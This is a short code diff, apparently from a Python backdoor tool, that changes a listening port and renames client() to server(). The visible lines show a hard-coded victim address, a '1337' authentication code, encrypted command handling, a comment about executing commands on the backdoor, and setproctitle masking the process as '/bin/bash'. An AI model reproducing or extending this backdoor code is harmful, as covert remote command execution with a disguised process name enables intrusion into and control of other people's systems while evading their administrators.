@@ -27,7 +27,7 @@ victim=("0.0.0.0",9999)
 messages = []
 authentication ="1337"
 
-myip=("192.168.0.3",66)
+myip=("192.168.0.3",9999)
 
 def secret_send(msg:str, type:str='command'):
     '''
@@ -129,7 +129,7 @@ def decrypt(command: str) -> str:
     plain = decryptor.decrypt(command)
     return plain
 
-def client():
+def server():
     while True:
         try:
             # Prompt user for the command they would like to execute on the backdoor.
@@ -226,4 +226,4 @@ def authenticate(packet):
 setproctitle.setproctitle("/bin/bash") #set fake process name
 #print(setproctitle.getproctitle())
 
-client()
+server()
